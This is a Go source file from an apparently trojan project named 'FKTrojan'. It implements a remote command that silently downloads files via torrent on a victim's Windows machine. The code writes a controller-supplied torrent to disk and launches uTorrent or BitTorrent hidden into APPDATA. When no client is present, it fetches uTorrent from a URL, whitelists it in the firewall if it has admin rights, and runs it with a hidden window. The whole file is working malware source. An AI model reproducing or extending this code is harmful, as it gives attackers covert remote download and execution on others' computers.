/*
Author: FreeKnight
通过传来的种子自动下载文件
*/
//https://forum.utorrent.com/topic/46012-utorrent-command-line-options/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

//------------------------------------------------------------
// 通过传来的种子，进行Torrent下载
func downloadByTorrentSeed(torrentData string) (string, error) {
	n := randomString(5, false)
	var Command string

	if checkIsFileExist(tmpAppDataInstallDir + "uTorrent\\uTorrent.exe") {
		Command = string(tmpAppDataInstallDir + "uTorrent\\uTorrent.exe" + " /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpAppDataInstallDir + n + ".torrent")

	} else if checkIsFileExist(tmpAppDataInstallDir + "BitTorrent\\BitTorrent.exe") {
		Command = string(tmpAppDataInstallDir + tmpAppDataInstallDir + "BitTorrent\\BitTorrent.exe" +
			" /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpAppDataInstallDir + n + ".torrent")

	} else if checkIsFileExist(tmpAppDataInstallDir + "uTorrent.exe") {
		Command = string(tmpAppDataInstallDir + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " +
			os.Getenv("APPDATA") + " " + tmpAppDataInstallDir + n + ".torrent")

	} else {
		// 先下载uTorrent
		output, err := os.Create(tmpAppDataInstallDir + "uTorrent.exe")
		if err != nil {
			return "", err
		}
		defer output.Close()
		response, err1 := http.Get(uTorrnetURL)
		if err1 != nil {
			return "", err1
		}
		defer response.Body.Close()
		_, err = io.Copy(output, response.Body)
		if err != nil {
			return "", err
		}
		if isAdmin {
			// 该函数结果不应该影响最终命令执行结果
			addFileToFirewall("uTorrent", tmpAppDataInstallDir+"uTorrent.exe")
		}

		Command = string(tmpAppDataInstallDir + "uTorrent.exe" + " /NOINSTALL /HIDE /DIRECTORY " + os.Getenv("APPDATA") + " " + tmpAppDataInstallDir + n + ".torrent")
	}

	n_Torrent, err2 := os.Create(tmpAppDataInstallDir + n + ".torrent")
	if err2 != nil {
		return "", err2
	}
	_, err2 = n_Torrent.WriteString(common.Base64Decode(torrentData))
	if err2 != nil {
		return "", err2
	}
	err2 = n_Torrent.Close()
	if err2 != nil {
		return "", err2
	}

	Exec := exec.Command("cmd", "/C", Command)
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err2 = Exec.Start()
	if err2 != nil {
		return "", err2
	}

	return "Download by Torrent seed successed.", nil
}

//------------------------------------------------------------
